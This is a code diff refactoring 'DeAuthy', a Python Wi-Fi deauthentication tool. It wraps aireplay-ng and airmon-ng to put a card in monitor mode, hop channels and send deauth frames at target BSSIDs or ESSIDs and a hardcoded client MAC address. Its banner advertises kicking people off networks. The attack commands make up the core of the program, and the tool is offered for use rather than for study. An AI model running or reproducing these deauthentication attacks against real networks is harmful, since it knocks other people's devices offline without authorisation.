@@ -1,4 +1,3 @@
-import deauthy.auto_installer
 from deauthy.auto_installer import Dependencies
 Dependencies.installed(self=Dependencies)
 from socket import if_nameindex
@@ -8,6 +7,7 @@ from halo import Halo
 from deauthy.deauthy_types import BSSID, ESSID, Interface
 from deauthy.terminal import Terminal
 from deauthy.checks import Checks
+from deauthy.functs import Functs
 
 red         = Terminal.Red
 cyan        = Terminal.Cyan
@@ -55,11 +55,11 @@ STATION = "8C:F5:A3:38:CC:73" # aka client mac address, the device you wish to d
 def clear():
     check_call(["clear"])
 
-    class Appearance:
+class Appearance:
 
-        def printBanner():
-            clear()
-            print(red + """
+    def printBanner():
+        clear()
+        print(red + """
 
 ██████╗ ███████╗     █████╗ ██╗   ██╗████████╗██╗  ██╗██╗   ██╗
 ██╔══██╗██╔════╝    ██╔══██╗██║   ██║╚══██╔══╝██║  ██║╚██╗ ██╔╝
@@ -67,44 +67,44 @@ def clear():
 ██║  ██║██╔══╝╚════╝██╔══██║██║   ██║   ██║   ██╔══██║  ╚██╔╝  
 ██████╔╝███████╗    ██║  ██║╚██████╔╝   ██║   ██║  ██║   ██║   
 ╚═════╝ ╚══════╝    ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚═╝  ╚═╝   ╚═╝                             
-            """ + light_green + """
+        """ + light_green + """
 Time to kick off some assholes from yer net""")
-            return True
+        return True
 
-    class BSSID_METHOD:
-        def deauth(bSSID: BSSID):
-            """"""
-            channel = Config.BSSIDs[bSSID]
-            deauthy.ChannelSys.hopper(channel)
-            try:
-                out = check_call(["aireplay-ng", "-0", "5", "-a", bSSID, "-c", Config.STATION, Config.iface_mon], stdout=DEVNULL, stderr=STDOUT)
-            except KeyboardInterrupt:
-                deauthy.InterfaceMode.switch(Interface(current_wiface), "managed")
-                return
-    class ESSID_METHOD:
-        def deauth(eSSID: str):
-            """"""
-            channel = Config.ESSID[eSSID]
-            deauthy.ChannelSys.hopper(channel)
-            try:
-                out = check_call(["aireplay-ng", "-0", "5", "-e", eSSID, "-c", Config.STATION, Config.iface_mon], stdout=DEVNULL, stderr=STDOUT)
-            except KeyboardInterrupt:
-                deauthy.InterfaceMode.switch(Interface(current_wiface), "managed")
-                return
+class BSSID_METHOD:
+    def deauth(bSSID: BSSID):
+        """"""
+        channel = Config.BSSIDs[bSSID]
+        ChannelSys.hopper(channel)
+        try:
+            out = check_call(["aireplay-ng", "-0", "5", "-a", bSSID, "-c", Config.STATION, Config.iface_mon], stdout=DEVNULL, stderr=STDOUT)
+        except KeyboardInterrupt:
+            Functs.switch(Interface(current_wiface), "managed")
+            return
+class ESSID_METHOD:
+    def deauth(eSSID: str):
+        """"""
+        channel = Config.ESSID[eSSID]
+        ChannelSys.hopper(channel)
+        try:
+            out = check_call(["aireplay-ng", "-0", "5", "-e", eSSID, "-c", Config.STATION, Config.iface_mon], stdout=DEVNULL, stderr=STDOUT)
+        except KeyboardInterrupt:
+            Functs.switch(Interface(current_wiface), "managed")
+            return
 
-    class ChannelSys:
-        def hopper(channel_number: int):
-            """Hop to a different channel"""
-            out = check_call(["airmon-ng", "start", f"{current_wiface}mon", f"{channel_number}"], stdout=DEVNULL, stderr=STDOUT)
+class ChannelSys:
+    def hopper(channel_number: int):
+        """Hop to a different channel"""
+        out = check_call(["airmon-ng", "start", f"{current_wiface}mon", f"{channel_number}"], stdout=DEVNULL, stderr=STDOUT)
 
 def main():
     def do_bssid_method():
         for bssid, channel in Config.BSSIDs.items():
-            deauthy.BSSID_METHOD.deauth(bssid)
+            BSSID_METHOD.deauth(bssid)
         try:
             do_bssid_method()
         except KeyboardInterrupt:
-            deauthy.InterfaceMode.switch(card=Interface(cardname), mode="managed")
+            Functs.switch(card=Interface(current_wiface), mode="managed")
             return
     
     Terminal.inform(msg=f"{bold}{light_green}Hey! {end}{light_white}Tip of the day: Parrot Security or Kali Linux is recommended! Although, real control freaks use ArchLinux")
@@ -112,11 +112,7 @@ def main():
     if Checks.has_root():
         Terminal.inform(msg=f"{white}Running as {light_green}{bold}Root{end}")
     Terminal.prompt(question=Terminal.deauthy_non_tag+"SH", allowed_replies=["any"], ending_color=yellow)
-    deauthy.Chipset_Support_Check()
-    Terminal.inform(msg=f"{bold}{white}Chipset is {light_green}supported!{end}")
-    Terminal.inform(msg=f"{cyan}Choose a {bold}{cyan}wireless{end}{cyan} interface {white}({light_white}{bold}step {light_green}1{end}{light_white}/{white}3)")
-    cardname = deauthy.prompt_for_ifaces()
-    deauthy.InterfaceMode.switch(card=Interface(cardname), mode="monitor")
+
     method = Terminal.prompt(question="Use ESSID or BSSIDs (BSSID / ESSID)", allowed_replies=["bssid", "essid"])
     if method == "BSSID":
         try:
@@ -127,17 +123,17 @@ def main():
                 Terminal.prompt(question=f"{white}Enter BSSID {light_green}{bold}{bssids_added+1}{end}{white}/{amt_of_bssids}", allowed_replies=["any"])
             do_bssid_method()
         except KeyboardInterrupt:
-            deauthy.InterfaceMode.switch(Interface(current_wiface), "managed")
+            Functs.switch(Interface(current_wiface), "managed")
             return
     elif method == "ESSID":
-        deauthy.ESSID_METHOD.deauth(Config.ESSID)
+        ESSID_METHOD.deauth(Config.ESSID)
         return
 
 try:
     if not Checks.has_root():
         Terminal.tell_issue(msg=f"{bold}{red}Run it as root...{end}")
         exit(1)
-    deauthy.Appearance.printBanner()
+    Appearance.printBanner()
     main()
 except KeyboardInterrupt:
     quit(0)
